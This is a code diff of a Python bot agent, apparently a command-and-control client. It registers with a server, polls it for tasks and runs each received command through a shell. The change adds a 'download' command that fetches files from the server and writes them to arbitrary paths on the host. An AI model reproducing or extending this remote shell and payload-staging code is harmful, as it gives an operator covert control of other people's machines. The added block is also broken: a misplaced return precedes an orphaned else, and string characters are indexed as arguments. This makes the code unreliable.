@@ -78,7 +78,7 @@ def register(ip, os, user):
 
     #return REGISTERKEY
 
-def fetchexec(ip):
+def fetchCommand(ip):
     url = URL + '/bot/' + ip + '/task'
     data = {'registerkey': REGISTERKEY}
 
@@ -99,11 +99,28 @@ def fetchexec(ip):
     else:
         command = json_data['command']
         print("[+] Command received: ", command)
-        try:
-            result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
-        except Exception as e: 
-            payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
-            return "Status: FAILED " + payload 
+        # TODO: Add upload/download/shell related functionality of the agent here 
+        if "download" == command.split(' ')[0]:
+            try:
+                filename = json_data['command'][1]
+                destination_path = json_data['command'][2]
+
+                download_url = URL + '/download/' + filename
+                myFile = requests.get(download_url)
+                open(destination_path,'wb').write(myFile.content)
+
+            except Exception as e:
+                return "[DEBUG] File Download Failed." + str(e) 
+
+        return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
+
+        #elif "upload" == command.split(' ')[0]: 
+        else:
+            try:
+                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
+            except Exception as e: 
+                payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
+                return "Status: FAILED " + payload 
         
         return result.decode('utf-8') 
 
@@ -133,11 +150,10 @@ def main():
     register(ip,host_os,user)
     
     while(1): 
-
         beat = heartbeat(ip, user)
         if beat is not None:
 
-            result = fetchexec(ip)
+            result = fetchCommand(ip)
 
             # If server response that the bot doesn't have anything, just sleep.
             if isinstance(result, str) and '[-]' in result:
